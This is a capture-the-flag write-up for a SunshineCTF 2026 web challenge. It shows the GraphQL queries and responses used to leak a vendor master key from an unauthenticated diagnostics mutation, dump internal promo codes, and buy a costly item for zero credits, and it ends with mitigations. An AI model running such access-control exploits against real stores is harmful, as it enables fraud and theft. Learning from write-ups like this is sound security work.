# Used Goods of Tomorrow — SunshineCTF 2026 (web, 500 pts)

**Flag:** `sun{1_l0v3_fr33_stuff}`

## Challenge summary

> Tomorrow-Mart sells used goods; a FutureBank account comes with 500 free
> credits. The grand prize — the deed to the Founders' Vault (Lot #4042) —
> costs 1,000,000 credits. Category hint: `jex`.

Service: `https://usedgoods.web.2026.sunshinectf.games/` (GraphQL at `/graphql`).

## Recon

The storefront is a thin JS client over a GraphQL API (`POST /graphql`,
`Authorization: Bearer <token>`). Useful introspection queries work, so the
schema can be mapped:

**Query fields:** `listings`, `listing(id)`, `myAccount`, `promoCodes(vendorKey: String!)`

**Mutation fields:**

| field | args | notes |
|---|---|---|
| `register` / `login` | `username`, `password` | returns `{token}` |
| `placeOrder` | `listingId: ID!`, `promoCode: String` | returns `{success message pricePaid flag}` |
| `vendorTerminalSync` | `terminalId: ID` | returns `{terminalId status firmware vendorKey note}` |

`placeOrder` on the Vault Deed without a promo correctly fails — 500 credits
won't cover 1,000,000.

Promo codes are pure lookup values (`SCOUT-10` = -10%); `promoCode` is *not*
an expression-injection sink, so the `jex` hint points elsewhere — at the
vendor terminal machinery.

## Step 1: unauthenticated vendor diagnostics leak the master key

`vendorTerminalSync` requires no privileges and reflects any `terminalId`:

```graphql
mutation { vendorTerminalSync(terminalId: "anything") {
  terminalId status firmware vendorKey note } }
```

Response (any terminalId):

```json
{
  "terminalId": "anything",
  "status": "ONLINE",
  "firmware": "vterm-beta-0.9.7",
  "vendorKey": "VND-MASTER-21d5f80206dffb6fa9ad5722",
  "note": "Diagnostics nominal. Remember to disable this endpoint before public launch."
}
```

A vendor master key, helpfully labelled, served to any authenticated shopper.

## Step 2: dump the promo table

`promoCodes` rejects normal users ("Vendor master key rejected") but accepts
the leaked key:

```graphql
{ promoCodes(vendorKey: "VND-MASTER-21d5f80206dffb6fa9ad5722") {
    code description percentOff appliesTo } }
```

```json
[
  { "code": "SCOUT-10",      "percentOff": 10,  "appliesTo": null   },
  { "code": "ATOMIC-25",     "percentOff": 25,  "appliesTo": "1001" },
  { "code": "FOUNDERS-100",  "percentOff": 100, "appliesTo": "4042",
    "description": "Founders’ comp — 100% off Lot #4042. Internal use only." }
]
```

## Step 3: buy the deed for 0 credits

```graphql
mutation {
  placeOrder(listingId: "4042", promoCode: "FOUNDERS-100") {
    success message pricePaid flag } }
```

```json
{
  "success": true,
  "pricePaid": 0,
  "message": "Order settled. “LOT #4042 — Founders’ Vault Deed (SEALED)” is yours for 0 credits. …",
  "flag": "sun{1_l0v3_fr33_stuff}"
}
```

## Attack chain

unauth `vendorTerminalSync` → vendor master key → `promoCodes(vendorKey)`
dumps internal 100%-off code → `placeOrder` with that code buys the
million-credit deed for 0.

## Mitigations

- `vendorTerminalSync` must require vendor authentication (or not exist on the
  public schema); it should never return secrets such as `vendorKey`.
- Treat promo codes as capability secrets: rate-limit guessing, tie
  `appliesTo`-restricted codes to server-side checks, and never allow 100%
  discounts on flagship items without out-of-band approval.
- Disable debug/diagnostics fields in production — the endpoint literally
  warned it should have been disabled before launch.
